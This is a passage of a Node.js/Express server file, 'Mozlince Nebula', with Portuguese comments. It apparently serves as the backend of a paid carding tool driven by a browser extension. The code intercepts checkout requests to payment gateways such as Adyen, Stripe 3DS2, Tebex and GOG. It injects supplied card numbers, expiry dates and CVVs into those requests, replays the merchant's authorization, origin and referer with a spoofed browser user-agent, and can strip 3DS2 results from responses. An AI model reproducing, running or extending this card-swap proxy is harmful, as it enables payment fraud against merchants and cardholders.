     /v1/gw/basistheory/*   (Basis Theory)
     /v1/gw/3ds2/*          (Stripe 3DS2)
     /v1/gw/encgw/*         (Custom encrypted gateways)
     /v1/gw/*               (fallback catch-all)
     /v1/process/*          (fallback legado)
     /v1/process            (fallback legado root)
   ═══════════════════════════════════════════════════════════════ */

// ── Dicionários de injeção ──
const JSON_ALIASES = {
  number: ['number','cardNumber','card_number','ccNumber','pan','account_number','paymentMethod.number','payment_method.number','card.number','creditCard.number','payment_method_data.card.number'],
  month: ['expiryMonth','exp_month','expMonth','expiration_month','expirationMonth','paymentMethod.expiryMonth','card.expiryMonth','payment_method.card.exp_month'],
  year:  ['expiryYear','exp_year','expYear','expiration_year','expirationYear','paymentMethod.expiryYear','card.expiryYear','payment_method.card.exp_year'],
  cvv:   ['cvc','cvv','securityCode','security_code','paymentMethod.cvc','card.cvc','payment_method.card.cvc'],
  holder:['holderName','cardholderName','holder_name','name','card.name','paymentMethod.holderName','payment_method.card.name']
};
const FORM_ALIASES = {
  number: ['card[number]','card_number','number','ccnumber','account_number','pan','payment_method.card.number'],
  month: ['card[exp_month]','exp_month','expmonth','month','ccmonth','payment_method.card.exp_month'],
  year: ['card[exp_year]','exp_year','expyear','year','ccyear','payment_method.card.exp_year'],
  cvv: ['card[cvc]','card[cvv]','cvc','cvv','ccv','security_code','payment_method.card.cvc'],
  holder: ['card[name]','card[holder]','cardholder','name','holder_name','ccname','payment_method.card.name']
};

// Campos que NUNCA devem ser sobrescritos pelo inject (BUG #3 do report)
const PROTECTED_CARD_FIELDS = new Set([
  'encryptedCardNumber', 'encryptedExpiryDate', 'encryptedExpiryYear', 'encryptedExpiryMonth',
  'encryptedSecurityCode', 'encryptedCardType', 'adyenToken', 'storedPaymentMethodId',
  'recurringDetailReference', 'paymentMethodId', 'token', 'id', 'cardToken',
  'paymentData', 'MD', 'PaReq', 'creq', 'basketToken', 'checkoutToken',
  'clientKey', 'sessionData', 'sessionId'
]);

function normalizeCard(card) {
  if (!card) return null;
  return {
    number: card.number || card.cardNumber || card.card_number || card.pan,
    month:  card.month  || card.exp_month || card.expMonth || card.expiration_month || card.expiryMonth,
    year:   card.year   || card.exp_year  || card.expYear  || card.expiration_year  || card.expiryYear,
    cvv:    card.cvv    || card.cvc      || card.security_code || card.securityCode,
    holder: card.holder || card.holderName || card.cardholder || card.name
  };
}

// BUG #15 do report: blacklist prototype pollution
const PROTO_BLACKLIST = new Set(['__proto__','constructor','prototype']);
function setDeep(obj, path, val) {
  const parts = String(path).split('.');
  for (const p of parts) { if (PROTO_BLACKLIST.has(p)) return obj; }
  let cur = obj;
  for (let i = 0; i < parts.length - 1; i++) {
    if (!cur[parts[i]] || typeof cur[parts[i]] !== 'object') cur[parts[i]] = {};
    cur = cur[parts[i]];
  }
  cur[parts[parts.length - 1]] = val;
  return obj;
}

function getDeep(obj, path) {
  const parts = String(path).split('.');
  let cur = obj;
  for (const p of parts) {
    if (cur && typeof cur === 'object' && p in cur) cur = cur[p];
    else return undefined;
  }
  return cur;
}

// BUG #3 do report: só sobrescreve se masked/vazio/placeholder — nunca sobrescreve dado real
function shouldOverwrite(cur) {
  if (cur === null || cur === undefined) return true;
  if (cur === '') return true;
  const s = String(cur);
  if (s.includes('*')) return true;                          // masked
  if (/^(test|placeholder|xxx|0000|x{4,})/i.test(s)) return true;
  return false;
}

function injectCardIntoJson(obj, card, opts = {}) {
  if (!obj || typeof obj !== 'object' || !card) return obj;
  const swapOnly = opts.swapOnly === true;
  for (const [key, paths] of Object.entries(JSON_ALIASES)) {
    const val = card[key];
    if (!val) continue;
    // Pula se o path final estiver na blacklist de campos protegidos
    let injected = false;
    for (const path of paths) {
      const leaf = path.split('.').pop();
      if (PROTECTED_CARD_FIELDS.has(leaf)) continue;
      const cur = getDeep(obj, path);
      if (cur !== undefined && !shouldOverwrite(cur)) {
        injected = true; // dado real existente — respeita
        break;
      }
      if (cur !== undefined) {
        // masked/vazio → pode sobrescrever
        setDeep(obj, path, val);
        injected = true;
        break;
      }
    }
    // NÃO injeta no primeiro alias como fallback (era o bug — vazava PAN)
    // Se nenhum path existe no payload e não é swap-only, ignora (deixa upstream decidir)
    if (!injected && swapOnly) continue;
  }
  return obj;
}

function injectCardIntoForm(raw, card, opts = {}) {
  if (!card) return raw || '';
  const swapOnly = opts.swapOnly === true;
  const params = new URLSearchParams(raw || '');
  for (const [key, aliases] of Object.entries(FORM_ALIASES)) {
    const val = card[key];
    if (!val) continue;
    let injected = false;
    for (const alias of aliases) {
      if (PROTECTED_CARD_FIELDS.has(alias)) continue;
      if (params.has(alias)) {
        const cur = params.get(alias) || '';
        // BUG #3: só sobrescreve se masked/vazio — NUNCA por length < 4
        if (shouldOverwrite(cur)) {
          params.set(alias, val);
        }
        injected = true;
        break;
      }
    }
    // Se o form não tem o campo, não injeta cegamente — só se swap-only
    if (!injected && swapOnly) continue;
  }
  // Expiração combinada MM/YY
  if (card.month && card.year) {
    const exp = `${String(card.month).padStart(2,'0')}/${String(card.year).slice(-2)}`;
    for (const alias of ['card[expiry]','expiry','expiration','card_expiry']) {
      if (params.has(alias)) {
        const cur = params.get(alias) || '';
        if (shouldOverwrite(cur)) { params.set(alias, exp); }
        break;
      }
    }
  }
  return params.toString();
}

// Headers que o proxy NÃO deve repassar do cliente para o upstream (evita spoofing)
const FORWARD_HEADER_BLOCKLIST = new Set([
  'host','connection','content-length','transfer-encoding','upgrade','keep-alive',
  'proxy-authorization','proxy-authenticate','te','trailer','expect'
]);

function pickForwardHeaders(req, extraJson) {
  const out = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9'
  };
  // x-asheo-headers (JSON da extensão) sobrescreve defaults
  if (req.headers['x-asheo-headers']) {
    try {
      const j = JSON.parse(req.headers['x-asheo-headers']);
      if (j && typeof j === 'object') {
        for (const [k, v] of Object.entries(j)) {
          if (!k) continue;
          const lk = String(k).toLowerCase();
          if (FORWARD_HEADER_BLOCKLIST.has(lk)) continue;
          out[lk] = String(v);
        }
      }
    } catch (e) { log('WARN', `x-asheo-headers inválido: ${e.message}`); }
  }
  // BUG #12: content-type respeita o header da extensão
  const ct = req.headers['content-type'] || 'application/json';
  out['content-type'] = ct;
  // BUG #5: authorization original do merchant vem em x-asheo-auth
  if (req.headers['x-asheo-auth']) out['authorization'] = req.headers['x-asheo-auth'];
  // BUG #6: origin/referer do merchant
  if (req.headers['x-asheo-origin']) {
    out['origin'] = req.headers['x-asheo-origin'];
    out['referer'] = req.headers['x-asheo-origin'].replace(/\/$/, '') + '/';
  }
  // x-asheo-clientkey → x-api-key (Adyen client key)
  if (req.headers['x-asheo-clientkey']) out['x-api-key'] = req.headers['x-asheo-clientkey'];
  // BUG #11: x-asheo-bt-host (Basis Theory)
  if (req.headers['x-asheo-bt-host']) out['x-asheo-bt-host'] = req.headers['x-asheo-bt-host'];
  return out;
}

// BUG #6 do report: specialHosts vem como {host, pattern, name} da extensão
function rewriteTarget(target, specialHostsRaw) {
  if (!target || !specialHostsRaw) return target;
  try {
    const hosts = JSON.parse(specialHostsRaw);
    if (!Array.isArray(hosts)) return target;
    for (const h of hosts) {
      if (!h) continue;
      // shape {host, pattern, name} (extensão) OU {from, to} (legado)
      const from = h.host || h.from;
      const to = h.pattern || h.to;
      if (from && to && target.includes(from)) {
        return target.replace(from, to);
      }
    }
  } catch (e) { log('WARN', `specialHosts inválido: ${e.message}`); }
  return target;
}

// BUG #8: repassa headers importantes do upstream pro cliente
const UPSTREAM_PASSTHROUGH_HEADERS = ['location','set-cookie','www-authenticate','retry-after','content-type','content-length'];

async function gwProxyHandler(req, res) {
  const t0 = Date.now();
  const auth = validateAnyAuth(req);
  if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth', detail: auth.error });

  const rawTarget = req.headers['x-asheo-target'] || req.query.target;
  const method = (req.headers['x-asheo-method'] || req.method || 'POST').toUpperCase();
  const finalTarget = rewriteTarget(rawTarget, req.headers['x-asheo-special-hosts']);

  if (!finalTarget || typeof finalTarget !== 'string') {
    return res.status(400).json({ ok:false, error:'missing_target' });
  }
  if (!isAllowedTarget(finalTarget)) {
    log('WARN', `Target bloqueado (não allowlist): ${finalTarget.substring(0, 120)}`);
    return res.status(403).json({ ok:false, error:'target_not_allowed', target: finalTarget.substring(0, 200) });
  }

  const isSwapOnly = req.headers['x-asheo-swap-only'] === 'true';
  const is3dsStrip = req.headers['x-asheo-3ds-strip'] === 'true';
  const forwardHeaders = pickForwardHeaders(req);

  // Parse do body (pode ser __asheo envelope ou cru)
  let card = null, originalBody = '', envelope = null;
  if (req.body && Buffer.isBuffer(req.body) && req.body.length > 0) {
    const raw = req.body.toString('utf8');
    try {
      const parsed = JSON.parse(raw);
      if (parsed && parsed.__asheo) {
        envelope = parsed.__asheo;
        if (envelope.card) card = normalizeCard(envelope.card);
        if (envelope.bin && !card) card = { number: envelope.bin }; // só BIN — não injeta
        originalBody = typeof parsed.body === 'string' ? parsed.body : (parsed.body != null ? JSON.stringify(parsed.body) : '');
      } else {
        originalBody = raw;
      }
    } catch { originalBody = raw; }
  } else if (req.body && typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
    originalBody = JSON.stringify(req.body);
  }
  // BUG #6: fallback x-asheo-card se não veio no envelope
  if (!card && req.headers['x-asheo-card']) {
    try { card = normalizeCard(JSON.parse(req.headers['x-asheo-card'])); } catch (e) { log('WARN', `x-asheo-card inválido: ${e.message}`); }
  }

  // Monta body final
  let bodyOut = originalBody;
  if (!isSwapOnly && card && card.number) {
    const ct = String(forwardHeaders['content-type'] || '').toLowerCase();
    try {
      if (ct.includes('application/json')) {
        const j = JSON.parse(originalBody || '{}');
        injectCardIntoJson(j, card, { swapOnly: false });
        bodyOut = JSON.stringify(j);
      } else if (ct.includes('application/x-www-form-urlencoded')) {
        bodyOut = injectCardIntoForm(originalBody, card, { swapOnly: false });
      }
    } catch (e) { log('WARN', `inject falhou: ${e.message}`); bodyOut = originalBody; }
  }

  // AbortController real (BUG #6 do report original)
  const ac = new AbortController();
  const timeout = setTimeout(() => { try { ac.abort(new Error('upstream_timeout_15s')); } catch {} }, 15000);
  // Combina com abort do cliente se disponível
  let clientSignal = null;
  try {
    if (typeof AbortSignal !== 'undefined' && typeof AbortSignal.any === 'function') {
      const rawSignal = new AbortController();
      req.on('close', () => { try { rawSignal.abort(); } catch {} });
      clientSignal = rawSignal.signal;
    }
  } catch {}

  let upstream;
  try {
    const fetchOpts = {
      method,
      headers: forwardHeaders,
      body: (method === 'GET' || method === 'HEAD') ? undefined : (bodyOut === '' ? undefined : bodyOut),
      signal: ac.signal,
      redirect: 'manual'
    };
    upstream = await fetch(finalTarget, fetchOpts);
  } catch (e) {
    clearTimeout(timeout);
    const isAbort = e && (e.name === 'AbortError' || /abort|timeout/i.test(String(e.message)));
    log('ERRO', `gwProxy upstream failed: ${e.message} (${Date.now()-t0}ms)`);
    return res.status(502).json({ ok:false, error: isAbort ? 'upstream_timeout' : 'upstream_failed', message: e.message });
  }
  clearTimeout(timeout);

  const respText = await upstream.text();
  let respJson = null;
  try { respJson = JSON.parse(respText); } catch {}

  // BUG #7: x-asheo-3ds-strip só filtra o RESPONSE, não o request
  if (is3dsStrip && respJson && typeof respJson === 'object') {
    delete respJson.threeDS2Result;
    delete respJson.challengeResult;
    // NÃO deleta threeDS2Token / threeDSCompInd — são do request
  }

  // Headers de retorno x-asheo-*
  const asheoHeaders = {
    'x-asheo-proxied': '1',
    'x-asheo-upstream-status': String(upstream.status),
    'x-asheo-elapsed-ms': String(Date.now() - t0)
  };
  if (card && !isSwapOnly) asheoHeaders['x-asheo-swapped'] = 'true';
  if (card && isSwapOnly) asheoHeaders['x-asheo-swap-ok'] = 'true';

  if (respJson && typeof respJson === 'object') {
    if (respJson.resultCode) {
      asheoHeaders['x-asheo-adyen-result'] = String(respJson.resultCode);
      if (respJson.resultCode === 'ChallengeShopper' || respJson.resultCode === 'IdentifyShopper') {
        asheoHeaders['x-asheo-3ds2-verdict'] = 'challenge_required';
        if (respJson.action && respJson.action.paymentData) {
          asheoHeaders['x-asheo-3ds2-trail'] = String(respJson.action.paymentData).substring(0, 4000);
          asheoHeaders['x-asheo-3ds2-payment-data'] = String(respJson.action.paymentData).substring(0, 4000);
        }
      } else if (respJson.resultCode === 'Authorised') {
        asheoHeaders['x-asheo-3ds2-verdict'] = 'authorised';
      } else if (respJson.resultCode === 'Refused') {
        asheoHeaders['x-asheo-3ds2-verdict'] = 'refused';
        if (respJson.refusalReason) asheoHeaders['x-asheo-adyen-reason'] = String(respJson.refusalReason).substring(0, 200);
      }
    }
    if (respJson.action && respJson.action.type === 'threeDS2') {
      asheoHeaders['x-asheo-3ds2-verdict'] = 'threeDS2_action';
      if (respJson.action.token) asheoHeaders['x-asheo-3ds2-token'] = String(respJson.action.token).substring(0, 4000);
      if (respJson.action.paymentData) asheoHeaders['x-asheo-3ds2-payment-data'] = String(respJson.action.paymentData).substring(0, 4000);
    }
  }

  // BUG #8: repassa headers do upstream pro cliente
  res.status(upstream.status);
  for (const h of UPSTREAM_PASSTHROUGH_HEADERS) {
    const v = upstream.headers.get(h);
    if (v) { try { res.setHeader(h, v); } catch {} }
  }
  for (const [k, v] of Object.entries(asheoHeaders)) { try { res.setHeader(k, v); } catch {} }

  // BUG #7: re-serializa response se strippamos algo
  if (is3dsStrip && respJson) return res.send(JSON.stringify(respJson));
  return res.send(respText);
}

// ── Rotas: Express 4 (usar * em vez de *splat) ──
app.all('/v1/gw/3ds2/*splat',         gwProxyHandler);
app.all('/v1/gw/adyen/*splat',        gwProxyHandler);
app.all('/v1/gw/chess/*splat',        gwProxyHandler);
app.all('/v1/gw/boosteroid/*splat',   gwProxyHandler);
app.all('/v1/gw/gog/*splat',          gwProxyHandler);
app.all('/v1/gw/tebex/*splat',        gwProxyHandler);
app.all('/v1/gw/tebex-creq/*splat',   gwProxyHandler);
app.all('/v1/gw/basistheory/*splat',  gwProxyHandler);
app.all('/v1/gw/encgw/*splat',        gwProxyHandler);
app.all('/v1/gw/*splat',              gwProxyHandler);   // catch-all por último
app.all('/v1/process/*splat',         gwProxyHandler);   // fallback legado
app.all('/v1/process',           gwProxyHandler);

/* ═══ CAMPAIGN CLICK ═══ */
app.post('/v1/campaign/click', async (req, res) => {
  const { campaignId, installId } = req.body || {};
  log('API', `/v1/campaign/click id=${campaignId||'∅'}`);
  if (campaignId) { try { const key = `ASHEO-CAMPAIGN-CLICKS-${normalizeKey(campaignId)}`; const cur = parseInt(await redisCmd(['GET', key]) || '0', 10); await redisCmd(['SET', key, String(cur + 1)]); } catch {} }
  res.json({ ok:true, received:true, serverTime: Date.now() });
});

/* ═══ 404 ═══ */
app.use((req,res)=>{ res.status(404).json({ok:false,error:'not_found',path:req.path}); });

/* ═══ START ═══ */
const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  banner();
  log('SYS', `Mozlince Nebula v8.5.1 Quantum+ na porta ${PORT}`);
  log('SYS', `Server URL: ${SERVER_URL}`);
  log('SYS', `Chave: ${ORIGEM}`);
  if (!PRIVATE_KEY) log('ERRO', 'SEM CHAVE PRIVADA — /v1/activate vai falhar 500');
  log('SYS', `Redis: ${UPSTASH_URL && UPSTASH_TOKEN ? 'OK' : 'FALTA (defina UPSTASH_REDIS_REST_URL/TOKEN)'}`);
  log('SYS', `Telegram: ${TELEGRAM_TOKEN ? 'OK' : 'FALTA (defina TELEGRAM_TOKEN)'}`);
  log('SYS', `OWNER_ID: ${OWNER_ID ? 'OK' : 'FALTA — bot não terá admin'}`);
  log('SYS', `Webhook secret: ${TELEGRAM_WEBHOOK_SECRET ? 'ATIVO' : 'ausente (recomendado setar)'}`);
  log('SYS', `Planos: ${Object.keys(PACOTES).length} (USD)`);
  log('RULES', `Payment Rules: ${PAYMENT_RULES.length} (v${RULES_VERSION})`);
  log('OK', `✔ Express 4 Routes (rotas /v1/gw/* com * — sem *splat)`);
  log('OK', `✔ 3DS2 Injection condicional (não sobrescreve encryptedCardNumber)`);
  log('OK', `✔ x-asheo-auth / x-asheo-origin / x-asheo-card lidos`);
  log('OK', `✔ location/set-cookie repassados do upstream`);
  log('OK', `✔ x-asheo-3ds-strip só filtra response`);
  log('OK', `✔ AbortController 15s no upstream`);
  log('OK', `✔ setDeep com blacklist __proto__/constructor/prototype`);
  log('OK', `✔ HMAC payload alinhado com inject.js (method\\npath\\nquery\\nts\\nbodyHash\\nbuild)`);
  log('OK', `✔ Rotas: adyen, chess, boosteroid, gog, tebex, tebex-creq, basistheory, 3ds2, encgw`);
});
server.setTimeout(30000);
server.keepAliveTimeout = 65000;
server.headersTimeout = 66000;

process.on('uncaughtException', e => { log('ERRO', 'Uncaught: ' + (e && e.stack || e)); process.exit(1); });
process.on('unhandledRejection', e => { log('ERRO', 'Rejection: ' + (e && e.stack || e)); });
process.on('SIGTERM', () => { log('SYS','SIGTERM — encerrando'); process.exit(0); });
process.on('SIGINT', () => { log('SYS','SIGINT — encerrando'); process.exit(0); });
